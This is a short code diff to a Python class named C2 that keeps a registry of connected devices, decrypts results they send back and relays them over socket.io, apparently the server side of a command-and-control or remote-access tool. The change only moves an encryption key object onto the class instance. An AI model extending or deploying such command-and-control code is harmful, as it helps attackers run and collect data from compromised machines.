@@ -21,6 +21,8 @@ class C2:
         self.devices = {}
         self.total_devices = {}
 
+        self.keys = keys
+
         try:
             with open("clients.json", "r") as f:
                 self.total_devices = json.load(f)
@@ -174,7 +176,7 @@ class C2:
     def get_result(self, sid, data):
         for device in self.devices:
             if self.devices[device]["sid"] == sid:
-                self.sio.emit("result", {"uid": device, "result": json.loads(keys.decrypt(data))})
+                self.sio.emit("result", {"uid": device, "result": json.loads(self.keys.decrypt(data))})
                 break
 
     def ctrl(self, data):
